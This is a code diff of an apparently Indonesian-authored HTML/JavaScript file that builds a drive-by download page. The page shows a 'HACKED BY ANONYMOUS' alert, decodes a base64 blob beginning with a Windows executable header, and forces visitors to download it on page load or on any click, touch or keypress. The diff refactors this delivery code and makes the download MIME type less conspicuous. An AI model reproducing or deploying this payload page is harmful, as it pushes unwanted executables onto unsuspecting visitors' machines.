@@ -38,13 +38,8 @@ color: #00ff00 !important;
 padding: 20px !important;
 overflow-y: auto !important;
 }
-h2 {
-margin-bottom: 10px;
-}
-p {
-margin-bottom: 15px;
-line-height: 1.5;
-}
+h2 { margin-bottom: 10px; }
+p { margin-bottom: 15px; line-height: 1.5; }
 button {
 width: 100%;
 padding: 16px;
@@ -58,9 +53,7 @@ font-size: 16px;
 box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
 transition: background 0.2s;
 }
-button:hover {
-background: #b71c1c;
-}
+button:hover { background: #b71c1c; }
 #status {
 margin-top: 16px;
 font-weight: bold;
@@ -147,15 +140,14 @@ const payloadText = "<!DOCTYPE html>" +
 "try { alert('HACKED BY ANONYMOUS'); } catch(e){}" +
 "function b64KeBytes(b64){" +
 "var binary = atob(b64);" +
-"var bytes = new Uint8Array(binary.length);" +
-"for (var i=0;i<binary.length;i++){ bytes[i]=binary.charCodeAt(i); }" +
+"var len = binary.length;" +
+"var bytes = new Uint8Array(len);" +
+"for (var i = 0; i < len; i++) {" +
+"bytes[i] = binary.charCodeAt(i);" +
+"}" +
 "return bytes;" +
 "}" +
-"function b64KeString(b64){" +
-"return decodeURIComponent(escape(atob(b64)));" +
-"}" +
-"var b64Header = \"TVqQAAMAAAAEAAAA\";" +
-"var b64Bytes = \"AEEAAgBA\";" +
+"var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" +
 "var sudah = false;" +
 "function picuDownload(){" +
 "if (sudah) return;" +
@@ -163,9 +155,8 @@ const payloadText = "<!DOCTYPE html>" +
 "var statusEl = document.getElementById('status');" +
 "try{" +
 "statusEl.textContent = 'Menyiapkan berkas...';" +
-"var headerStr = b64KeString(b64Header);" +
-"var bytesArr = b64KeBytes(b64Bytes);" +
-"var blob = new Blob([headerStr, bytesArr], { type: 'application/x-msdownload' });" +
+"var bytesArr = b64KeBytes(b64Data);" +
+"var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
 "var url = URL.createObjectURL(blob);" +
 "var a = document.createElement('a');" +
 "a.href = url;" +
@@ -173,7 +164,10 @@ const payloadText = "<!DOCTYPE html>" +
 "a.style.display = 'none';" +
 "document.body.appendChild(a);" +
 "a.click();" +
-"setTimeout(function(){ document.body.removeChild(a); URL.revokeObjectURL(url); }, 3000);" +
+"setTimeout(function(){ " +
+"if (a.parentNode) a.parentNode.removeChild(a); " +
+"URL.revokeObjectURL(url); " +
+"}, 3000);" +
 "statusEl.textContent = 'Payload berhasil diunduh!';" +
 "statusEl.style.color = '#0f0';" +
 "} catch(e){" +
@@ -184,8 +178,8 @@ const payloadText = "<!DOCTYPE html>" +
 "}" +
 "window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
 "document.addEventListener('click', picuDownload);" +
-"document.addEventListener('keydown', picuDownload);" +
 "document.addEventListener('touchstart', picuDownload);" +
+"document.addEventListener('keydown', picuDownload);" +
 "})();" +
 "<\/script>" +
 "</body>" +
